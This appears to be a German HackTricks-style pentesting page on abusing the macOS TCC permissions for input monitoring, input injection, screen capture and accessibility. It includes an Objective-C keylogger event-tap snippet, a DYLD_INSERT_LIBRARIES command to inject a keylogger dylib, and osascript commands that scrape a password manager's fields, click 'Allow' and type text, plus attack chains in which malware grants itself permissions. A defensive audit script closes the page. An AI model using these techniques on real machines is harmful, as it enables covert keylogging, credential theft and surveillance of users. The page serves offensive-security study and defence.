# Missbrauch von macOS Input Monitoring, Screen Capture und Accessibility

{{#include ../../../banners/hacktricks-training.md}}

## Überblick

Drei verwandte TCC-Dienste steuern, wie Anwendungen die Desktop-Sitzung des Benutzers beobachten und mit ihr interagieren können:

| TCC Service | Berechtigung | Fähigkeit |
|---|---|---|
| `kTCCServiceListenEvent` | **Input Monitoring** | Alle Tastatur- und Mausereignisse systemweit lesen (Keylogging) |
| `kTCCServicePostEvent` | **Input Injection** | Synthetische Tastatur- und Mausereignisse injizieren |
| `kTCCServiceScreenCapture` | **Screen Capture** | Den Display-Puffer lesen, Screenshots erstellen und den Bildschirm aufzeichnen |
| `kTCCServiceAccessibility` | **Accessibility** | Andere Anwendungen über die AXUIElement API steuern und UI-Elemente lesen |

Diese Berechtigungen bilden **die gefährlichste Kombination unter macOS** — zusammen ermöglichen sie:
- Vollständiges Keylogging jedes Tastendrucks (Passwörter, Nachrichten, Kreditkarten)
- Bildschirmaufzeichnung sämtlicher sichtbarer Inhalte
- Injektion synthetischer Eingaben (Schaltflächen anklicken, Dialoge bestätigen)
- Vollständige GUI-Steuerung, die dem physischen Zugriff gleichkommt

---

## Input Monitoring (kTCCServiceListenEvent)

### Funktionsweise

macOS verwendet die **`CGEventTap` API**, damit Prozesse Eingabeereignisse aus dem Quartz-Ereignissystem abfangen können. Ein Prozess mit ListenEvent-Berechtigung kann einen Event Tap erstellen, der **jedes Tastatur- und Mausereignis** empfängt, bevor es die Zielanwendung erreicht oder nachdem es sie erreicht hat.<sup>[[1]](#references)</sup>
```objc
// Create an event tap that captures all key-down events
CGEventMask mask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);

CFMachPortRef tap = CGEventTapCreate(
kCGSessionEventTap,        // Tap at the session level (all apps)
kCGHeadInsertEventTap,     // Insert before the event reaches the app
kCGEventTapOptionListenOnly, // Listen only (don't modify events)
mask,
eventCallback,             // Callback receives every matching event
NULL
);

// The callback receives every keyDown in the entire session:
CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type,
CGEventRef event, void *userInfo) {
UniChar chars[4];
UniCharCount len;
CGEventKeyboardGetUnicodeString(event, 4, &len, chars);
// chars now contains what the user typed
return event;
}
```
### Binaries mit Berechtigungen finden
```bash
# Find processes with input monitoring TCC grants
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"

# System-level grants
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"
```
### Angriff: Keylogging via Code Injection

Wenn ein Binary mit der Berechtigung **ListenEvent** außerdem die **deaktivierte Bibliotheksvalidierung** aufweist oder **DYLD-Umgebungsvariablen zulässt**, kann ein Angreifer eine Dylib injizieren, die einen CGEventTap registriert:
```bash
# Check if the target allows code injection
codesign -d --entitlements - /path/to/input-monitor-app 2>&1 | \
grep -E "allow-dyld|disable-library-validation"

# If both are present, inject a keylogger dylib:
DYLD_INSERT_LIBRARIES=/tmp/keylogger.dylib /path/to/input-monitor-app
```
Die injizierte dylib übernimmt die ListenEvent-TCC-Berechtigung des Ziels und zeichnet alle Tastatureingaben auf.

### Attack: Credential Harvesting

Ein ausgefeilter Keylogger kann Tastatureingaben mit der aktiven Anwendung korrelieren:
```objc
// Get the frontmost application to contextualize keystrokes
NSRunningApplication *frontApp = [[NSWorkspace sharedWorkspace] frontmostApplication];
NSString *appName = frontApp.localizedName;

// If appName is "Safari" or "Chrome" and the URL bar contains a login page,
// the next typed sequence is likely a password
```
---

## Input Injection (kTCCServicePostEvent)

### Funktionsweise

Die PostEvent-Berechtigung ermöglicht das Erstellen eines event tap mit **`kCGEventTapOptionDefault`** (kann Events ändern/einschleusen) anstelle von ListenOnly.<sup>[[1]](#references)</sup> Dies ermöglicht:
```objc
// Inject a keystroke
CGEventRef keyDown = CGEventCreateKeyboardEvent(NULL, kVK_Return, true);
CGEventRef keyUp = CGEventCreateKeyboardEvent(NULL, kVK_Return, false);
CGEventPost(kCGSessionEventTap, keyDown);
CGEventPost(kCGSessionEventTap, keyUp);

// Inject a mouse click at coordinates
CGEventRef click = CGEventCreateMouseEvent(NULL, kCGEventLeftMouseDown,
CGPointMake(100, 200),
kCGMouseButtonLeft);
CGEventPost(kCGSessionEventTap, click);
```
### Angriff: Automatische TCC-Genehmigung von Abfragen

Mit PostEvent kann ein Angreifer **das Klicken auf „Allow“** in TCC-Berechtigungsdialogen simulieren:
```bash
# Using cliclick (if available) or direct CGEvent injection:
# 1. Trigger a TCC prompt for the malware
# 2. Wait for the dialog to appear
# 3. Inject a mouse click on the "Allow" button coordinates
# 4. Malware now has the requested permission
```
---

## Bildschirmaufnahme (kTCCServiceScreenCapture)

### Funktionsweise

Die Berechtigung für Bildschirmaufnahmen ermöglicht das Lesen des Anzeigepuffers mithilfe von:
- **`CGWindowListCreateImage`** — Aufnahme eines beliebigen Fensters oder des gesamten Bildschirms
- **`ScreenCaptureKit`** (macOS 12.3+) — moderne API für das Streaming von Bildschirminhalten<sup>[[3]](#references)</sup>
- **`CGDisplayStream`** — hardwarebeschleunigte Bildschirmaufnahme
```objc
// Capture the entire main display
CGImageRef screenshot = CGWindowListCreateImage(
CGRectInfinite,
kCGWindowListOptionOnScreenOnly,
kCGNullWindowID,
kCGWindowImageDefault
);
// screenshot contains everything visible on screen
```
### Screen-Capture-Clients finden
```bash
# TCC database query
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceScreenCapture';"

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE tccPermsStr LIKE '%kTCCServiceScreenCapture%';"
```
### Angriff: Credential Capture via OCR

Ein injizierter Screen-Capture-Prozess kann regelmäßig Frames erfassen und OCR verwenden, um Passwörter zu extrahieren:
```bash
# Basic screen capture from a process with the TCC grant
screencapture -x /tmp/screen.png

# Capture a specific window (by window ID)
screencapture -x -l <windowID> /tmp/window.png
```
> [!WARNING]
> Ab **macOS Sonoma** zeigt die Bildschirmaufnahme einen **dauerhaften Indikator** in der Menüleiste an. In älteren Versionen konnte die Bildschirmaufzeichnung vollständig unbemerkt bleiben. Eine kurze Aufnahme von nur einem einzelnen Frame kann Benutzern jedoch weiterhin unbemerkt bleiben.

### Angriff: Session Recording

Eine kontinuierliche Bildschirmaufzeichnung ermöglicht eine vollständige Wiedergabe der Sitzung des Benutzers:
```objc
// Using ScreenCaptureKit for streaming capture (macOS 12.3+)
// This captures frames continuously with minimal CPU impact
SCStreamConfiguration *config = [[SCStreamConfiguration alloc] init];
config.width = 1920;
config.height = 1080;
config.minimumFrameInterval = CMTimeMake(1, 5); // 5 FPS
// Stream captures everything: passwords, documents, private messages
```
---

## Barrierefreiheit (kTCCServiceAccessibility)

### Funktionsweise

Der Zugriff auf die Barrierefreiheit gewährt über die **AXUIElement API** die Kontrolle über andere Anwendungen.<sup>[[2]](#references)</sup> Ein Prozess mit Barrierefreiheitszugriff kann:

1. **Jedes** UI-Element in jeder Anwendung lesen (Textfelder, Beschriftungen, Schaltflächen, Menüs)
2. **Schaltflächen anklicken** und mit Steuerelementen interagieren
3. **Text** in jedes Textfeld eingeben
4. **Menüs und Dialoge** navigieren
5. In jeder laufenden Anwendung angezeigte Daten **auslesen**
```objc
// Get the frontmost application
AXUIElementRef app = AXUIElementCreateApplication(pid);

// Get its windows
CFArrayRef windows;
AXUIElementCopyAttributeValue(app, kAXWindowsAttribute, (CFTypeRef *)&windows);

// Read a text field's value
AXUIElementRef textField = /* find the text field */;
CFTypeRef value;
AXUIElementCopyAttributeValue(textField, kAXValueAttribute, &value);
// value contains whatever text is displayed in the field
```
### Angriff: Sich selbst TCC-Berechtigungen gewähren

Der gefährlichste Missbrauch von **Bedienungshilfen** besteht darin, durch die Systemeinstellungen zu navigieren, um der eigenen Malware zusätzliche Berechtigungen zu gewähren:
```bash
# Using osascript with accessibility access:
# Navigate to Privacy & Security > Full Disk Access
osascript -e '
tell application "System Settings"
activate
delay 1
end tell
tell application "System Events"
tell process "System Settings"
-- Navigate to Privacy & Security
-- Click the lock to authenticate
-- Toggle on Full Disk Access for the malware
end tell
end tell'
```
### Angriff: Anwendungsübergreifendes Data Scraping
```bash
# Read data from any application's UI
osascript -e 'tell application "System Events" to get value of text field 1 of window 1 of process "Safari"'

# Get all visible window titles
osascript -e 'tell application "System Events" to get name of every window of every process whose visible is true'

# Scrape password manager display (if unlocked and visible)
osascript -e 'tell application "System Events" to get value of every text field of window 1 of process "1Password"'
```
### Angriff: Automatisierte Benutzeraktionen
```bash
# Click a specific UI element
osascript -e '
tell application "System Events"
tell process "Finder"
click button "Allow" of window 1
end tell
end tell'

# Type text into focused field
osascript -e 'tell application "System Events" to keystroke "malicious command"'
osascript -e 'tell application "System Events" to key code 36' -- Press Enter
```
---

## Angriffsketten

### Kette: Eingabeüberwachung + Bildschirmaufzeichnung = vollständige Überwachung
```
1. Inject into binary with ListenEvent + ScreenCapture
2. CGEventTap captures all keystrokes
3. Periodic screen captures provide visual context
4. Correlate: keystroke timing + active window + screen content
5. Result: passwords, private messages, financial data
```
### Chain: Accessibility + PostEvent = Vollständige Fernsteuerung
```
1. Inject into binary with Accessibility + PostEvent
2. Use AXUIElement to read current screen state
3. Use CGEventPost to inject keystrokes and clicks
4. Navigate System Settings to grant more permissions
5. Open Terminal, type commands as if the user did it
6. Result: equivalent to physical keyboard/mouse access
```
### Kette: Accessibility → Selbst erteilte Kamera-/Mikrofonberechtigung → Überwachung
```
1. Start with only Accessibility permission
2. Open System Settings > Privacy & Security > Camera
3. Use accessibility API to toggle camera access for malware
4. Repeat for Microphone, Screen Recording, Full Disk Access
5. Malware now has full surveillance capabilities
6. Result: one TCC permission escalates to total control
```
---

## Erkennung und Aufzählung
```bash
#!/bin/bash
echo "=== TCC Input/Screen/Accessibility Audit ==="

for db in "$HOME/Library/Application Support/com.apple.TCC/TCC.db" "/Library/Application Support/com.apple.TCC/TCC.db"; do
echo -e "\n[*] Database: $db"
for svc in kTCCServiceListenEvent kTCCServicePostEvent kTCCServiceScreenCapture kTCCServiceAccessibility; do
echo "  $svc:"
sqlite3 "$db" "SELECT '    ' || client || ' (auth=' || auth_value || ')' FROM access WHERE service='$svc' AND auth_value=2;" 2>/dev/null
done
done

echo -e "\n[*] Processes with injectable + input monitoring:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE tccPermsStr LIKE '%kTCCServiceListenEvent%'
AND (noLibVal=1 OR allowDyldEnv=1);" 2>/dev/null
```
## Referenzen

- [1] [Apple Developer — Event Taps](https://developer.apple.com/documentation/coregraphics/quartz_event_services)
- [2] [Apple Developer — Accessibility API](https://developer.apple.com/documentation/applicationservices/axuielement_h)
- [3] [Apple Developer — ScreenCaptureKit](https://developer.apple.com/documentation/screencapturekit)
- [4] [Objective-See — Accessibility Abuse as TCC Bypass](https://objective-see.org/blog.html)

{{#include ../../../banners/hacktricks-training.md}}
